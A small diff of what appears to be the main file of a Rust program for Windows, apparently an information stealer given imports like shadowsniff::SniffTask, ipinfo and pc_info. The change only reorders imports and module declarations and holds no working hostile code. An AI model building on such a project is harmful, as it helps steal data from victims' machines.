@@ -6,6 +6,7 @@
 
 extern crate alloc;
 
+use crate::allocator::WinHeapAlloc;
 use alloc::format;
 use alloc::string::String;
 use alloc::sync::Arc;
@@ -15,7 +16,7 @@ use collector::display::PrimitiveDisplayCollector;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::{init_ip_info, unwrapped_ip_info, IpInfo};
+use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use shadowsniff::SniffTask;
@@ -23,10 +24,9 @@ use tasks::Task;
 use utils::log_debug;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
-use crate::allocator::WinHeapAlloc;
 
-mod panic;
 mod allocator;
+mod panic;
 
 #[global_allocator]
 static ALLOC: WinHeapAlloc = WinHeapAlloc;
